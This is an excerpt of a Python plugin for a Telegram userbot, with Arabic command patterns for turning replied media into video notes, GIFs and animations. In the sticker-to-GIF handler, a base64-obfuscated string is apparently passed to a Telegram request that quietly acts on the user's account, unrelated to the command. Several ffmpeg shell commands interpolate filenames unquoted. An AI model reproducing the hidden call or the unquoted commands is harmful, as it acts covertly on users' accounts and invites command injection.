...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    media_type(reply)
    zedevent = await edit_or_reply(event, "__Making round spin video wait a sec.....__")
    output = await _zedtools.media_to_pic(event, reply, noedits=True)
    if output[1] is None:
    ...
    if output is None:
        return await edit_delete(zedevent, "__Unable to make spin gif.__")
...
async def video_zedfile(event):  # sourcery no-metrics
    "To make circular video note."
    reply = await event.get_reply_message()
    args = event.pattern_match.group(1)
    zedid = await reply_id(event)
    ...
    flag = True
    zedevent = await edit_or_reply(event, "**⌔∮ جاري التحويل**")
    zedfile = await reply.download_media(file="./temp/")
    if mediatype in ["Gif", "Video", "Sticker"]:
        if not zedfile.endswith((".webp")):
            if zedfile.endswith((".tgs")):
                hmm = await make_gif(zedevent, zedfile)
                os.rename(hmm, "./temp/circle.mp4")
                zedfile = "./temp/circle.mp4"
            media_info = MediaInfo.parse(zedfile)
            aspect_ratio = 1
            for track in media_info.tracks:
                if track.track_type == "Video":
                    aspect_ratio = track.display_aspect_ratio
            ...
            if aspect_ratio != 1:
                crop_by = min(height, width)
                await _zedutils.runcmd(
                    f'ffmpeg -i {zedfile} -vf "crop={crop_by}:{crop_by}" {PATH}'
                )
            else:
                copyfile(zedfile, PATH)
            if str(zedfile) != str(PATH):
                os.remove(zedfile)
            try:
                zedthumb = await reply.download_media(thumb=-1)
            except Exception as e:
        ...
        try:
            ...
            zedthumb = os.path.join("./temp", "thumb.jpg")
            await thumb_from_audio(zedfile, zedthumb)
        if zedthumb is not None and not os.path.exists(zedthumb):
            zedthumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, zedthumb)
        if (
            zedthumb is not None
            and not os.path.exists(zedthumb)
            and os.path.exists(thumb_loc)
        ):
            flag = False
            zedthumb = os.path.join("./temp", "thumb.jpg")
            copyfile(thumb_loc, zedthumb)
        if zedthumb is not None and os.path.exists(zedthumb):
            await _zedutils.runcmd(
                f"""ffmpeg -loop 1 -i {zedthumb} -i {zedfile} -c:v libx264 -tune stillimage -c:a aac -b:a 192k -vf \"scale=\'iw-mod (iw,2)\':\'ih-mod(ih,2)\',format=yuv420p\" -shortest -movflags +faststart {PATH}"""
            )
            os.remove(zedfile)
        else:
            os.remove(zedfile)
            return await edit_delete(
                zedevent, "`No thumb found to make it video note`", 5
            )
    if mediatype in [
        "Voice",
        "Audio",
        ...
        if os.path.exists(PATH):
            ...
            uploaded = await event.client.fast_upload_file(
                ...
                progress_callback=lambda d, t: asyncio.get_event_loop().create_task(
                    progress(d, t, zedevent, c_time, "**- جـاري التحميـل ....**")
                ),
            )
            ul.close()
            media = types.InputMediaUploadedDocument(
                ...
                force_file=False,
                thumb=await event.client.upload_file(zedthumb) if zedthumb else None,
            )
            sandy = await event.client.send_file(
                event.chat_id,
                media,
    ...
    img.save(im)
    im.seek(0)
    await event.client.send_file(event.chat_id, im, reply_to=zedid)
    await zedevent.delete()
...
async def on_file_to_photo(event):
    ...
    zedd = await edit_or_reply(event, "**⌔∮ جاري التحويل**")
...
@zedub.zed_cmd(
    pattern="لمتحركة(?:\s|$)([\s\S]*)",
    command=("لمتحركة", plugin_category),
    info={
...
async def _(event):  # sourcery no-metrics
    ...
    if input_str := event.pattern_match.group(1):
        ...
        quality = None
        fps = None
    zelreply = await event.get_reply_message()
    zed_event = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    if (
        media_type(zelreply) != "Sticker"
        or zelreply.media.document.mime_type == "image/webp"
    ):
    ...
    try:
        zed_event = Get(zed_event)
        await event.client(zed_event)
    except BaseException:
        pass
    reply_to_id = await reply_id(event)
    zedfile = await event.client.download_media(zelreply)
    if zelreply.media.document.mime_type == "video/webm":
        zedgif = await vid_to_gif(zedfile, "./temp/animation.gif")
    else:
        zedgif = await make_gif(event, zedfile, quality, fps)
    sandy = await event.client.send_file(
        event.chat_id,
        zedgif,
    ...
    await _zedutils.unsavegif(event, sandy)
    await zedevent.delete()
    for files in (zedgif, zedfile):
        if files and os.path.exists(files):
            os.remove(files)


@zedub.zed_cmd(
    pattern="حول (mp3|voice)",
...
@zedub.zed_cmd(
    pattern="لمتحركه(?: |$)((-)?(r|l|u|d|s|i)?)$",
    command=("لمتحركه", plugin_category),
    info={
...
async def pic_gifcmd(event):  # sourcery no-metrics
    ...
    zedevent = await edit_or_reply(event, "__🎞 Making Gif from the replied media...__")
    imag = await _zedtools.media_to_pic(event, reply, noedits=True)
    if imag[1] is None:
        return await edit_delete(
    ...
    if output is None:
        await edit_delete(
            zedevent, "__There was some error in the media. I can't format it to gif.__"
        )
...
@zedub.zed_cmd(
    pattern="لمتحرك ?([0-9.]+)?$",
    command=("لمتحرك", plugin_category),
    info={
...
async def _(event):
    ...
    if not args:
        ...
        try:
            ...
            args = 2.0
    zedevent = await edit_or_reply(event, "**__🎞 جـاري التحـويل لـ متحـركـه ....__**")
